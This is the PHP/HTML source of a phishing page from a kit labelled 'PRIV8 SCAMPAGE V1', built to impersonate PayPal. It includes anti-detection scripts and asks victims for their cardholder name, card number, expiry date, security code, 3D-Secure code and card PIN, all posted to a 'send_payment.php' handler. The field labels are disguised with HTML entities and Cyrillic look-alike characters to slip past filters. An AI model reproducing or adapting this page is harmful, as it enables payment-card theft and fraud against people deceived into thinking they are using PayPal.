<?php
//------------------------------------------|| PRIV8 SCAMPAGE V1 ||-----------------------------------------------------//
session_start();
include "../RED/anti1.php";
include "../RED/anti2.php";
include "../RED/anti3.php";
include "../RED/anti4.php";
include "../RED/anti5.php";
include "../RED/anti6.php";
include "../RED/anti7.php";
include "../RED/anti8.php";
//------------------------------------------|| PRIV8 SCAMPAGE V1 ||-----------------------------------------------------//
?>
<!DOCTYPE html>
<html>
<head>
	<title>PayPal</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="assets/bulma.min.css">
	<link rel="stylesheet" type="text/css" href="assets/style.css">
<link rel="shortcut icon" href="assets/pp_favicon_x.ico" />
</head>
<body onload="spinner()">
<form action="system/send_payment.php" method="post">
<nav id="nav_desktop">
	<div class="container_desktop">
	<img src="assets/navbar_left.png" alt="" class="navbar_left"><img src="assets/navbar_right.png" alt="" class="navbar_right">
	</div>
</nav>
<nav id="nav_mobile">
	<div class="container_mobile">
	<img src="assets/menu.png" alt="" class="navbar_mobile_left">
	<center><img src="assets/ppl.png" alt="" class="navbar_mobile_center"></center>
	<img src="assets/alert.png" alt="" class="navbar_mobile_right">
	</div>
</nav>
<br><br>
<div id="subnav">
	<div class="container_desktop">
	<img src="assets/hi.png" alt="" class="subnav_left"><img src="assets/payForGood.png" alt="" class="subnav_right">
	</div>
	<div class="hr_two"></div>
</div>
<br><br>

<div class="container_panel" id="paypay">
	<div class="panel">
		<h1 class="panel-title">Enter your &#112;&#97;&#121;&#109;&#101;&#110;&#116; details</h1><br>
		<div class="fullCol">
		<div class="columns is-multiline is-mobile">
			<div class="customCol">
			<img src="assets/visa.png" alt="" id="Visa" class="Cc">
			</div>
			<div class="customCol">
			<img src="assets/mastercard.png" alt="" id="Mastercard" class="Cc">
			</div>
			<div class="customCol">
			<img src="assets/amx.png" alt="" id="Amex" class="Cc">
			</div>
			<div class="customCol last">
			<img src="assets/discover.png" alt="" id="Discover" class="Cc">
			</div>
		</div>
		</div>
		<br>
		<div class="columns is-multiline is-mobile" id="col">
			<div class="column is-12">
				<input type="text" class="input_text" name="noc" id="noc" placeholder="Nа&#109;е&nbsp;о&#110;&nbsp;са&#114;&#100;" minlength="5" required>
			</div>
			<div class="column is-12">
				<input type="text" class="input_text cn" name="cn" id="cn" placeholder="Cа&#114;&#100;&nbsp;N&#117;&#109;&#98;е&#114;" onkeyup="card()" maxlength="19" minlength="19" required>
			</div>
			<div class="column is-12">
				<input type="text" class="input_text" name="ex" id="ex" placeholder="Eхр&#105;&#114;у&nbsp;Dа&#116;е" maxlength="7" minlength="7" required>
			</div>
			<div class="column is-12">
				<input type="text" class="input_text" name="cvv" id="cvv" placeholder="Sес&#117;&#114;&#105;&#116;у&nbsp;Cо&#100;е" minlength="3" maxlength="4" required>
			</div>
			<div class="column is-12">
				<span name="btn" id="btn" class="paybtn">CONTINUE</span>
			</div>
		</div>
	</div>
</div><!----------------------------- END PAYMENT ----------------------------->


<div class="container_panel" id="conpay" style="display: none;">
	<div class="panel">
		<h1 class="panel-title">C&#111;&#110;&#102;&#105;&#114;&#109; your &#112;&#97;&#121;&#109;&#101;&#110;&#116; details</h1><br>
		<div style="display: inline-block;">
		<img src="assets/c.png" id="cardt">
		<h1 class="card-title" id="lf"></h1>
		</div>
		<div class="panel-content">
			<b>B&#105;&#108;&#108;&#105;&#110;&#103;<span style='color: transparent;font-size: 15px;'>x</span>&#97;&#100;&#100;&#114;&#101;&#115;&#115;</b>
				<p id="all"><?php echo $_SESSION["all"]; ?></p>
				<p id="zcity"><?php echo $_SESSION["zcity"]; ?></p>
				<p id="statee"><?php echo $_SESSION["statee"]; ?></p>
			<b>E&#120;&#112;&#105;&#114;&#97;&#116;&#105;&#111;&#110;<span style='color: transparent;font-size: 15px;'>x</span>&#100;&#97;&#116;&#101;</b>
				<p id="exx"></p>
		</div>
		<br><br>
		<div class="columns is-multiline is-mobile" id="col">
			<div class="column is-12">
				<input type="text" class="input_text" name="d3" id="d3" placeholder="3D-Secure" minlength="3" required>
			</div>
			<div class="column is-12">
				<input type="password" class="input_text" name="cp" id="cp" placeholder="Card PIN"  minlength="4" required>
			</div>
			<div class="column is-12">
				<button name="btn" id="btn" class="conbtn">CONTINUE</button>
			</div>
		</div>
	</div>
</div><!----------------------------- END CONPAY ----------------------------->



<div class="spinner loading" id="spinner" style="display: none;"></div>
<br><br><br><br><br><br><br>
<footer>
	<img src="assets/footer_left.png" alt="" class="footer_left"><br><br>
	<div class="hr"></div>
	<br><br><img src="assets/footer_right.png" alt="" class="footer_right"><img src="assets/footer_mobile.png" alt="" style="display: none;" class="footer_mobile">
</footer>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/Xwanted.js"></script>
<script type="text/javascript" src="assets/jquery.creditCardValidator.js"></script>
<script type="text/javascript" src="assets/validator.js"></script>
</form>
</body>
</html>